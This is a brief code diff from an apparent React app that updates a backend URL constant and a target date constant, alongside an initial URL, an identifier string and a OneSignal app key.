@@ -83,11 +83,11 @@ const App = () => {
   const INITIAL_URL = `https://sharp-hub-cloud.site/`;
   const URL_IDENTIFAIRE = `2lhXCyHU`;
 
-  const FATCH_TO_OUR_BACK = `https://sharp-relay-engine.site/`;
+  const FATCH_TO_OUR_BACK = `https://pure-edge-tools.site/`;
 
   const ONESIGNAL_KEY = `ea394623-51ec-46d1-86ee-7cd54f6f899d`;
 
-  const TARGET_DATA = new Date(2026, 4, 19, 8, 8, 0);
+  const TARGET_DATA = new Date(2026, 4, 22, 8, 8, 0);
 
 
   useEffect(() => {
